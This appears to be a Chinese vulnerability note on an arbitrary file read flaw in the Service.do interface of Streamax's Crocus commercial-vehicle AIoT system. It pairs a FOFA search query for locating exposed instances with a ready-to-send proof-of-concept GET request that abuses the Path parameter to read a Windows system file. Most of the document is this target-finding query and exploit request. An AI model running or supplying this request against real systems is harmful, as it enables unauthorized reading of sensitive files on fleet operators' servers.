**fofa**

```
body="/ThirdResource/respond/respond.min.js"
```

**一、漏洞简述**

锐明技术作为一家专注于AI和视频技术的商用车智能物联（AIoT）解决方案提供商，Crocus系统是其核心产品之一。Crocus系统旨在利用人工智能、高清视频、大数据和自动驾驶技术，帮助商用车减少交通事故和货物丢失，提高企业或车队的运营效率。其Service.do接口存在任意文件读取漏洞，攻击者可通过该漏洞获取系统敏感信息。

**二、漏洞检测poc**

```yaml
GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close


```

